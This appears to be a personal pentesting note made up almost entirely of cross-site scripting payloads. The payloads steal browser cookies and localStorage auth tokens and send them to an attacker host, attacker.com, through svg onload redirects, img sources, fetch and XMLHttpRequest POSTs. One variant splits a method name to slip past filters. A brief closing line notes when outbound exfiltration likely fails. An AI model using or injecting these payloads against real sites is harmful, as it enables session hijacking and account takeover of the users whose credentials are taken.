**When Cookies Are Accessible via document.cookie:**
```
<svg onload=location.href='//attacker.com/?cookie='+document.cookie>
<img src='//attacker.com/?cookie='+document.cookie>
<script>fetch('//attacker.com/',{method:'POST',body:document.cookie})</script>
<script>var xhr=new XMLHttpRequest();xhr.open('POST','//attacker.com/',true);xhr.send(document.cookie);</script>

**When Cookies or Tokens Are Stored in localStorage:**
<script>fetch('//attacker.com/',{method:'POST',body:localStorage.getItem('authToken')})</script>
<img src='//attacker.com/?token='+localStorage.getItem('authToken')>
<svg onload=location.href='//attacker.com/?token='+localStorage.getItem('authToken')>

**Combination for Cookies and localStorage:**
<script>fetch('//attacker.com/',{method:'POST',body:'cookie='+document.cookie+'&token='+localStorage.getItem('authToken')})</script>
<svg onload=location.href='//attacker.com/?cookie='+document.cookie+'&token='+localStorage.getItem('authToken')>
<script>fetch('//attacker.com/',{method:'POST',body:localStorage['g'+'etItem']('authToken')})</script>
```

If you see this most likely cant xss outbound
![[Pasted image 20251102211222.png]]